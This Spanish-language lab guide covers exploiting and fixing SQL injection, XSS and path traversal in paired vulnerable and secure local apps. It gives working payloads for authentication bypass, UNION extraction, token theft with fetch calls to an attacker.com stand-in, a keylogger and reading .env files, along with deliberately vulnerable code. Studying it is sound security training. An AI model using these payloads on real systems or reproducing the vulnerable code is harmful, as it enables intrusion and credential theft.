# 🎯 GUÍA DE EXPLOTACIÓN Y MITIGACIÓN DE VULNERABILIDADES

Esta guía muestra paso a paso cómo explotar las vulnerabilidades en `owasp_vulnerable` y cómo están protegidas en `owasp_seguro`.

---

## 📋 ÍNDICE

1. [CWE-89: SQL Injection](#cwe-89-sql-injection)
2. [CWE-79: Cross-Site Scripting (XSS)](#cwe-79-cross-site-scripting-xss)
3. [CWE-73: Path Traversal](#cwe-73-path-traversal)
4. [Comparación de Código](#comparación-de-código)

---

## CWE-89: SQL Injection

### 🔴 EXPLOTACIÓN (owasp_vulnerable - Puerto 4000)

#### **Ataque 1: Bypass de Autenticación**

**Objetivo**: Iniciar sesión sin conocer la contraseña

**Pasos**:
1. Abrir http://localhost:4000
2. En el campo **Username**, ingresar: `admin' OR '1'='1' --`
3. En el campo **Password**, ingresar: `cualquiercosa`
4. Click en "► INICIAR SESIÓN"

**¿Por qué funciona?**

```javascript
// Código vulnerable en pages/api/login.js
const unsafeQuery = `SELECT id, username, role FROM users 
  WHERE username = '${username}' AND password = '${password}' LIMIT 1`;
```

**Query resultante**:
```sql
SELECT id, username, role FROM users 
WHERE username = 'admin' OR '1'='1' --' AND password = 'cualquiercosa' 
LIMIT 1
```  

**Explicación**: 
- El `--` comenta el resto de la consulta
- `'1'='1'` siempre es verdadero
- La consulta retorna el primer usuario (admin)

**✅ Resultado**: Acceso concedido como administrador sin contraseña válida

---

#### **Ataque 2: Extracción de Todos los Usuarios**

**Objetivo**: Obtener la lista completa de usuarios mediante la búsqueda

**Pasos**:
1. Iniciar sesión normalmente con `admin` / `adminpass`
2. En el dashboard, ir a la sección "CWE-89: SQL Injection - Búsqueda"
3. En el campo de búsqueda, ingresar: `' OR '1'='1`
4. Click en "🔍 Buscar"

**¿Por qué funciona?**

```javascript
// Código vulnerable en pages/api/search.js
const unsafeQuery = `SELECT id, username, role FROM users 
  WHERE username LIKE '%${q}%' ORDER BY id`;
```

**Query resultante**:
```sql
SELECT id, username, role FROM users 
WHERE username LIKE '%' OR '1'='1%' ORDER BY id
```

**✅ Resultado**: Se muestran TODOS los usuarios del sistema

---

#### **Ataque 3: UNION-based SQL Injection**

**Objetivo**: Extraer datos de columnas específicas (ejemplo: contraseñas)

**Payload**: `' UNION SELECT id, username, password FROM users --`

**Query resultante**:
```sql
SELECT id, username, role FROM users 
WHERE username LIKE '%' UNION SELECT id, username, password FROM users --%' 
ORDER BY id
```

**✅ Resultado**: Potencialmente expone contraseñas en texto plano

---

### 🟢 MITIGACIÓN (owasp_seguro - Puerto 3001)

#### **Cómo está protegido**:

```javascript
// Código seguro en pages/api/login.js
const safeQuery = 'SELECT id, username, role FROM users WHERE username = $1 AND password = $2 LIMIT 1';
const result = await db.query(safeQuery, [username, password]);
```

```javascript
// Código seguro en pages/api/search.js
const safeQuery = 'SELECT id, username, role FROM users WHERE username LIKE $1 ORDER BY id';
const { rows } = await db.query(safeQuery, [`%${q}%`]);
```

**Técnica de protección**: **Prepared Statements (Consultas Parametrizadas)**

**¿Cómo funciona?**
1. La consulta SQL se separa de los datos
2. Los parámetros (`$1`, `$2`) son placeholders
3. El driver de PostgreSQL escapa automáticamente caracteres especiales
4. Es imposible "salirse" de los parámetros para inyectar SQL

**Prueba de verificación**:
1. Ir a http://localhost:3001
2. Intentar login con: `admin' OR '1'='1' --` / `x`
3. **❌ Resultado**: Login fallará (busca ese username literalmente)

4. En búsqueda, intentar: `' OR '1'='1`
5. **❌ Resultado**: Busca literalmente ese texto, sin resultados

---

## CWE-79: Cross-Site Scripting (XSS)

### 🔴 EXPLOTACIÓN (owasp_vulnerable - Puerto 4000)

#### **Ataque 1: JavaScript Básico (Alert)**

**Objetivo**: Ejecutar código JavaScript en el navegador

**Pasos**:
1. Login en http://localhost:4000
2. Ir a la sección "CWE-79: Cross-Site Scripting (XSS)"
3. En el campo de comentario, ingresar:
   ```html
   <script>alert('¡XSS Vulnerable!')</script>
   ```
4. Click en "💬 Enviar Comentario"

**✅ Resultado**: Se ejecuta el alert inmediatamente y cada vez que alguien carga la página

---

#### **Ataque 2: Robo de Token de Sesión**

**Objetivo**: Capturar el token JWT del localStorage

**Payload**:
```html
<img src=x onerror="alert('Token: ' + localStorage.getItem('token'))">
```

**✅ Resultado**: Muestra el token JWT que podría usarse para suplantar al usuario

---

#### **Ataque 3: Robo de Cookies (Simulado)**

**Payload**:
```html
<img src=x onerror="alert('Cookie: ' + document.cookie)">
```

En un ataque real, el código enviaría los datos a un servidor del atacante:
```html
<img src=x onerror="fetch('http://attacker.com/steal?token=' + localStorage.getItem('token'))">
```

---

#### **Ataque 4: Redirección Maliciosa**

**Objetivo**: Redirigir usuarios a un sitio de phishing

**Payload**:
```html
<img src=x onerror="window.location='http://google.com'">
```

**✅ Resultado**: Redirige automáticamente a cualquier usuario que vea la página

---

#### **Ataque 5: Modificación del DOM**

**Payload**:
```html
<script>
document.querySelector('h1').innerHTML = '🔓 SISTEMA COMPROMETIDO';
document.body.style.backgroundColor = 'red';
</script>
```

**✅ Resultado**: Modifica la apariencia de la página (defacement)

---

#### **Ataque 6: Keylogger Simple**

**Payload**:
```html
<script>
document.onkeypress = function(e) {
  console.log('Tecla capturada:', e.key);
  // En un ataque real: fetch('http://attacker.com/log?key=' + e.key)
}
alert('Keylogger activado. Abre la consola y escribe algo.');
</script>
```

**✅ Resultado**: Captura todas las teclas presionadas por el usuario

---

### 🟢 MITIGACIÓN (owasp_seguro - Puerto 3001)

#### **Cómo está protegido**:

**Backend** (`pages/api/comments.js`):
```javascript
// Función de sanitización
function escapeHtml(text) {
  const map = {
    '&': '&amp;',
    '<': '&lt;',
    '>': '&gt;',
    '"': '&quot;',
    "'": '&#039;',
    '/': '&#x2F;'
  };
  return text.replace(/[&<>"'/]/g, (m) => map[m]);
}

// Sanitizar antes de guardar
const sanitizedComment = escapeHtml(comment.trim());

// Validación adicional
if (sanitizedComment.length > 1000) {
  return res.status(400).send('Comentario demasiado largo');
}
```

**Frontend** (`pages/dashboard.js`):
```javascript
// NO usar dangerouslySetInnerHTML
// React escapa automáticamente el contenido:
<div>{c.comment}</div>
```

**Técnica de protección**: **HTML Encoding + Output Escaping**

**¿Cómo funciona?**
1. Todos los caracteres peligrosos se convierten a HTML entities
2. `<` se convierte en `&lt;`
3. `>` se convierte en `&gt;`
4. El navegador muestra los caracteres, pero no los ejecuta

**Ejemplo de conversión**:
```
Input:  <script>alert('XSS')</script>
Output: &lt;script&gt;alert(&#039;XSS&#039;)&lt;/script&gt;
Mostrado: <script>alert('XSS')</script> (como texto)
```

**Prueba de verificación**:
1. Ir a http://localhost:3001
2. Intentar enviar: `<script>alert('XSS')</script>`
3. **❌ Resultado**: Se muestra como texto plano, no se ejecuta

4. Intentar: `<img src=x onerror=alert(1)>`
5. **❌ Resultado**: Se muestra como texto, la imagen no se carga

---

## CWE-73: Path Traversal

### 🔴 EXPLOTACIÓN (owasp_vulnerable - Puerto 4000)

#### **Ataque 1: Acceder a Archivo Secreto**

**Objetivo**: Leer `secret.txt` que está fuera del directorio permitido

**Pasos**:
1. Login en http://localhost:4000
2. Ir a la sección "CWE-73: Path Traversal"
3. En el campo "Archivo a descargar", cambiar de `document1.txt` a: `../secret.txt`
4. Click en "📥 Descargar"

**¿Por qué funciona?**

```javascript
// Código vulnerable en pages/api/download.js
const basePath = path.join(process.cwd(), 'public', 'files');
const filePath = path.join(basePath, file); // Sin validación
const content = fs.readFileSync(filePath, 'utf8');
```

**Path resultante**:
```
basePath: C:\...\owasp_vulnerable\public\files
file: ../secret.txt
filePath: C:\...\owasp_vulnerable\public\files\..\secret.txt
→ C:\...\owasp_vulnerable\public\secret.txt ✅ ACCESO PERMITIDO
```

**✅ Resultado**: Se descarga el archivo con información confidencial

---

#### **Ataque 2: Acceder a package.json**

**Payload**: `../../package.json`

**Path resultante**:
```
C:\...\owasp_vulnerable\public\files\..\..\package.json
→ C:\...\owasp_vulnerable\package.json
```

**✅ Resultado**: Expone dependencias y configuración del proyecto

---

#### **Ataque 3: Intentar Acceder a .env**

**Payload**: `../../../.env`

**Path resultante**:
```
C:\...\owasp_vulnerable\public\files\..\..\..\..env
→ C:\...\owasp_vulnerable\.env (si existe en esa ubicación)
```

**✅ Resultado**: Podría exponer credenciales de base de datos y secretos

---

#### **Ataque 4: Archivos del Sistema (Windows)**

**Payload**: `..\..\..\..\..\windows\system32\drivers\etc\hosts`

**✅ Resultado**: Potencialmente podría leer archivos del sistema operativo

---

### 🟢 MITIGACIÓN (owasp_seguro - Puerto 3001)

#### **Cómo está protegido**:

```javascript
// Código seguro en pages/api/download.js

// CAPA 1: Whitelist de archivos permitidos
const ALLOWED_FILES = [
  'document1.txt',
  'document2.txt',
  'report.txt',
  'manual.txt'
];

if (!ALLOWED_FILES.includes(file)) {
  return res.status(403).send('Acceso al archivo no permitido');
}

// CAPA 2: Validación de caracteres peligrosos
if (file.includes('..') || file.includes('/') || file.includes('\\')) {
  return res.status(400).send('Nombre de archivo inválido');
}

// CAPA 3: Uso de path.basename() - Extrae solo el nombre
const safeName = path.basename(file);

// CAPA 4: Validación de path resuelto
const basePath = path.join(process.cwd(), 'public', 'files');
const filePath = path.join(basePath, safeName);

const resolvedPath = path.resolve(filePath);
const resolvedBase = path.resolve(basePath);

if (!resolvedPath.startsWith(resolvedBase)) {
  return res.status(403).send('Acceso denegado: path traversal detectado');
}
```

**Técnica de protección**: **Defensa en Profundidad (4 capas)**

**¿Cómo funciona cada capa?**

1. **Whitelist**: Solo permite archivos específicos por nombre
2. **Validación de caracteres**: Bloquea `..`, `/`, `\`
3. **path.basename()**: Extrae solo el nombre del archivo, elimina paths
4. **path.resolve()**: Verifica que el path final esté dentro del directorio permitido

**Prueba de verificación**:
1. Ir a http://localhost:3001
2. Intentar descargar: `../secret.txt`
3. **❌ Resultado**: Error 403 - "Acceso al archivo no permitido"

4. Intentar: `document1.txt/../secret.txt`
5. **❌ Resultado**: Error 400 - "Nombre de archivo inválido"

6. Intentar: `../../package.json`
7. **❌ Resultado**: Error 403 - Bloqueado por whitelist

---

## 📊 COMPARACIÓN DE CÓDIGO

### CWE-89: SQL Injection

| Aspecto | Vulnerable ❌ | Seguro ✅ |
|---------|--------------|-----------|
| **Query** | `` `WHERE username = '${user}'` `` | `WHERE username = $1` |
| **Parámetros** | Concatenación directa | Array de parámetros |
| **Escapado** | Ninguno | Automático por driver |
| **Protección** | 0% | 100% |

**Vulnerable**:
```javascript
const query = `SELECT * FROM users WHERE username = '${username}'`;
await db.query(query);
```

**Seguro**:
```javascript
const query = 'SELECT * FROM users WHERE username = $1';
await db.query(query, [username]);
```

---

### CWE-79: XSS

| Aspecto | Vulnerable ❌ | Seguro ✅ |
|---------|--------------|-----------|
| **Backend** | Sin sanitización | `escapeHtml()` |
| **Frontend** | `dangerouslySetInnerHTML` | Texto plano |
| **Validación** | Ninguna | Longitud máxima |
| **Encoding** | No | HTML entities |

**Vulnerable**:
```javascript
// Backend
const { comment } = req.body;
await db.query('INSERT INTO comments ... VALUES ($1)', [comment]);

// Frontend
<div dangerouslySetInnerHTML={{__html: comment}} />
```

**Seguro**:
```javascript
// Backend
function escapeHtml(text) {
  return text.replace(/[&<>"'/]/g, (m) => map[m]);
}
const sanitized = escapeHtml(comment.trim());
await db.query('INSERT INTO comments ... VALUES ($1)', [sanitized]);

// Frontend
<div>{comment}</div>  // React escapa automáticamente
```

---

### CWE-73: Path Traversal

| Aspecto | Vulnerable ❌ | Seguro ✅ |
|---------|--------------|-----------|
| **Whitelist** | No | Sí (ALLOWED_FILES) |
| **Validación** | No | 4 capas |
| **Path resolution** | `path.join()` directo | `path.resolve()` + verificación |
| **Caracteres peligrosos** | Permitidos | Bloqueados |

**Vulnerable**:
```javascript
const { file } = req.query;
const filePath = path.join(basePath, file);
const content = fs.readFileSync(filePath);
```

**Seguro**:
```javascript
const ALLOWED_FILES = ['document1.txt', 'document2.txt'];

if (!ALLOWED_FILES.includes(file)) return 403;
if (file.includes('..')) return 400;
const safeName = path.basename(file);

const resolvedPath = path.resolve(path.join(basePath, safeName));
if (!resolvedPath.startsWith(path.resolve(basePath))) return 403;

const content = fs.readFileSync(resolvedPath);
```

---

## 🧪 MATRIZ DE PRUEBAS

| Vulnerabilidad | Payload de Prueba | Puerto 4000 (Vulnerable) | Puerto 3001 (Seguro) |
|----------------|-------------------|--------------------------|----------------------|
| **SQLi Login** | `admin' OR '1'='1' --` | ✅ Acceso concedido | ❌ Login fallido |
| **SQLi Search** | `' OR '1'='1` | ✅ Todos los usuarios | ❌ Sin resultados |
| **XSS Alert** | `<script>alert(1)</script>` | ✅ Ejecuta alert | ❌ Muestra texto |
| **XSS Token** | `<img src=x onerror=alert(localStorage.token)>` | ✅ Roba token | ❌ Muestra texto |
| **Path Basic** | `../secret.txt` | ✅ Descarga archivo | ❌ Error 403 |
| **Path Advanced** | `../../package.json` | ✅ Expone config | ❌ Error 403 |

---

## 🎯 EJERCICIO PRÁCTICO

### Secuencia de Pruebas Recomendada

#### **Paso 1: Explotar Vulnerabilidades**

1. **SQL Injection**
   - Abrir http://localhost:4000
   - Login con `admin' OR '1'='1' --` / `x`
   - Buscar: `' OR '1'='1`
   - Observar los resultados

2. **XSS**
   - Comentar: `<script>alert('XSS')</script>`
   - Comentar: `<img src=x onerror=alert(localStorage.token)>`
   - Ver cómo se ejecuta el código

3. **Path Traversal**
   - Descargar: `../secret.txt`
   - Descargar: `../../package.json`
   - Ver el contenido expuesto

#### **Paso 2: Verificar Protecciones**

1. **SQL Injection**
   - Abrir http://localhost:3001
   - Intentar los mismos payloads
   - Verificar que fallen

2. **XSS**
   - Intentar los mismos scripts
   - Verificar que se muestren como texto

3. **Path Traversal**
   - Intentar los mismos paths
   - Verificar errores 403/400

---

## 📚 RECURSOS ADICIONALES

### Para Aprender Más

- **OWASP Top 10**: https://owasp.org/www-project-top-ten/
- **OWASP Cheat Sheets**: https://cheatsheetseries.owasp.org/
- **CWE-89**: https://cwe.mitre.org/data/definitions/89.html
- **CWE-79**: https://cwe.mitre.org/data/definitions/79.html
- **CWE-73**: https://cwe.mitre.org/data/definitions/73.html

### Herramientas de Testing

- **Burp Suite**: Interceptar y modificar requests
- **OWASP ZAP**: Scanner de vulnerabilidades
- **SQLMap**: Automatización de SQL Injection
- **XSS Hunter**: Detectar XSS

---

## ⚠️ DISCLAIMER LEGAL

Esta guía es **SOLO para propósitos educativos** en ambientes controlados.

**PERMITIDO**:
- ✅ Usar en `owasp_vulnerable` en tu máquina local
- ✅ Practicar en entornos de prueba autorizados
- ✅ Aprender sobre seguridad web

**PROHIBIDO**:
- ❌ Usar en aplicaciones que no te pertenecen
- ❌ Atacar sistemas sin autorización explícita
- ❌ Usar en producción o sistemas reales

**El uso no autorizado de estas técnicas es ILEGAL** y puede resultar en:
- Sanciones penales
- Demandas civiles
- Expulsión académica
- Antecedentes criminales

---

## 📞 SOPORTE

Si tienes dudas sobre la implementación o necesitas más ejemplos:

1. Revisa los archivos README.md en cada proyecto
2. Examina el código fuente en `pages/api/`
3. Consulta RESUMEN_VULNERABILIDADES.md para análisis técnico detallado

---

**¡Buen aprendizaje y happy hacking (ético)! 🎓🔒**
